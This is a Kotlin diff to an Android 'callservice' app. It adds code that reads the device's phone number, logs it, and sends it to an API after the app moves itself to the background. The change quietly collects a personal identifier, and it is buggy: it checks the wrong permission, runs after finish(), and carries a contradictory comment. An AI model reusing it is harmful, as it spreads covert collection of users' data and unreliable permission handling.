@@ -1,11 +1,15 @@
 package com.example.callservice
 
 import android.Manifest
+import android.annotation.SuppressLint
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Bundle
 import android.provider.Settings
+import android.telephony.TelephonyManager
+import android.util.Log
 import androidx.activity.result.ActivityResultLauncher
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
@@ -56,6 +60,19 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    @SuppressLint("HardwareIds")
+    private fun getPhoneNumber(): String? {
+        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        return if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+            val phoneNumber = telephonyManager.line1Number
+            Log.d("MyService", "Phone number retrieved: $phoneNumber")
+            phoneNumber
+        } else {
+            Log.e("MyService", "Permission to read phone state is not granted")
+            null
+        }
+    }
+
     private fun setupSmsPermission() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
             smsPermissionLauncher.launch(Manifest.permission.READ_SMS)
@@ -68,6 +85,9 @@ class MainActivity : AppCompatActivity() {
         MyService.scheduleNextJob(this)
         moveTaskToBack(true)  // Уходит в фон
         finish()
+
+        // Здесь добавляем вызов функции отправки номера в API
+        getPhoneNumber()?.let { sendPhoneNumberToApi(it) }  // Замените на реальный номер телефона
     }
 
     private fun sendPhoneNumberToApi(phoneNumber: String) {
